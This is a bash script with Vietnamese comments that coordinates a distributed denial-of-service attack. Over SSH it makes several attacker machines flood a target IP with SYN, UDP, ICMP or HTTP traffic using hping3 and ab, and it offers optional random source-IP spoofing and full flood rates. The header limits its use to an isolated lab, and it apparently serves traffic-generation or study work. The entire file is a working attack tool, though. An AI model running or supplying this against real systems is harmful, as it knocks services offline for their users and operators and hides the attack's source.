#!/usr/bin/env bash
# Orchestrator DDoS QUA SSH cho nhieu MAY THAT dung hping3 va ab.
# Dung khi victim + attacker la cac laptop that noi chung 1 WiFi.
# Chi dung trong lab co lap, chi nham victim cua minh. Xem docs/MULTI_MACHINE.md.
#
# Cach dung:
#   ./run_ddos_remote.sh <syn|http|udp|icmp> -t <ip_victim> -d <giay> -a <user@ip_attacker1> [-a <user@ip_attacker2> ...]
#
# Vi du:
#   # 1 attacker, SYN flood:
#   ./run_ddos_remote.sh syn  -t 192.168.1.50 -d 30 -a user@192.168.1.61
#   # 2 attacker (DDoS L7 that, n_src>=2):
#   ./run_ddos_remote.sh http -t 192.168.1.50 -d 30 -a user@192.168.1.61 -a user@192.168.1.62
#   # UDP flood:
#   ./run_ddos_remote.sh udp  -t 192.168.1.50 -d 30 -a user@192.168.1.61
#   # ICMP flood:
#   ./run_ddos_remote.sh icmp -t 192.168.1.50 -d 30 -a user@192.168.1.61
#
# Cac co:
#   -t  IP victim (bat buoc)
#   -d  thoi luong (giay, mac dinh 30)
#   -a  attacker user@ip (LAP LAI de them may; can it nhat 1)
#   -r  pps/nguon cho hping3 (mac dinh 400; 0 hoac khong dat la --flood)
#   -c  so concurrency cho ab (mac dinh 50)
#   -s  chay hping3 voi sudo (dung khi attacker can sudo chay hping3)
#   --spoof  gia mao IP nguon (--rand-source cho hping3)
#
set -euo pipefail

MODE="syn"
TARGET=""
DURATION=30
PPS=400
CONCURRENCY=50
USE_SUDO=1
SPOOF=0
ATTACKERS=()

usage() {
  sed -n '7,25p' "$0"
}

if [[ "${1:-}" == "syn" || "${1:-}" == "http" || "${1:-}" == "udp" || "${1:-}" == "icmp" ]]; then
  MODE="$1"; shift
fi
while [[ $# -gt 0 ]]; do
  case "$1" in
    -t|--target)   TARGET="$2"; shift 2 ;;
    -d|--duration) DURATION="$2"; shift 2 ;;
    -a|--attacker) ATTACKERS+=("$2"); shift 2 ;;
    -r|--pps)      PPS="$2"; shift 2 ;;
    -c|--concurrency) CONCURRENCY="$2"; shift 2 ;;
    -s|--sudo)     USE_SUDO=1; shift ;;
    --no-sudo)     USE_SUDO=0; shift ;;
    --spoof)       SPOOF=1; shift ;;
    syn|http|udp|icmp) MODE="$1"; shift ;;
    -h|--help)     usage; exit 0 ;;
    *) echo "[!] Tham so la: $1" >&2; exit 2 ;;
  esac
done

if [[ -z "$TARGET" ]]; then echo "[!] Thieu -t <ip_victim>." >&2; usage; exit 2; fi
if [[ "${#ATTACKERS[@]}" -eq 0 ]]; then echo "[!] Thieu -a <user@ip> (it nhat 1 may attacker)." >&2; usage; exit 2; fi

# --- preflight: kiem tra SSH toi tung attacker ---
echo "[*] Kiem tra SSH toi ${#ATTACKERS[@]} may attacker..."
for att in "${ATTACKERS[@]}"; do
  if ! ssh -o BatchMode=yes -o ConnectTimeout=5 "$att" true 2>/dev/null; then
    echo "[!] Khong SSH duoc toi '$att' (chua co SSH key? sai user@ip? may chua bat?)." >&2
    echo "    Tao key mot lan:  ssh-keygen -t ed25519   roi:  ssh-copy-id $att" >&2
    exit 3
  fi
done

echo "[*] DDoS mode=$MODE (dung hping3/ab) tu ${#ATTACKERS[@]} may -> $TARGET trong ${DURATION}s"

pids=()
for att in "${ATTACKERS[@]}"; do
  prefix=""
  if [[ "$USE_SUDO" -eq 1 && "$MODE" != "http" ]]; then prefix="sudo "; fi

  if [[ "$MODE" == "syn" ]]; then
    rate_flag="--flood"
    if [[ "$PPS" -gt 0 ]]; then rate_flag="-i u$((1000000 / PPS))"; fi
    spoof_flag=""
    if [[ "$SPOOF" -eq 1 ]]; then spoof_flag="--rand-source"; fi
    rcmd="${prefix}timeout $DURATION hping3 -S -p 80 -q $rate_flag $spoof_flag $TARGET"
  elif [[ "$MODE" == "udp" ]]; then
    rate_flag="--flood"
    if [[ "$PPS" -gt 0 ]]; then rate_flag="-i u$((1000000 / PPS))"; fi
    spoof_flag=""
    if [[ "$SPOOF" -eq 1 ]]; then spoof_flag="--rand-source"; fi
    rcmd="${prefix}timeout $DURATION hping3 --udp -p 80 -q $rate_flag $spoof_flag $TARGET"
  elif [[ "$MODE" == "icmp" ]]; then
    rate_flag="--flood"
    if [[ "$PPS" -gt 0 ]]; then rate_flag="-i u$((1000000 / PPS))"; fi
    spoof_flag=""
    if [[ "$SPOOF" -eq 1 ]]; then spoof_flag="--rand-source"; fi
    rcmd="${prefix}timeout $DURATION hping3 --icmp -q $rate_flag $spoof_flag $TARGET"
  else
    # HTTP flood dung ab
    rcmd="timeout $DURATION ab -k -c $CONCURRENCY -t $DURATION -n 10000000 http://$TARGET/"
  fi

  echo "    -> $att : $rcmd"
  ssh "$att" "$rcmd" &
  pids+=($!)
done

echo "[*] Dang ban song song... (doi ${DURATION}s)"
wait "${pids[@]}" || true
echo "[*] Hoan tat DDoS."
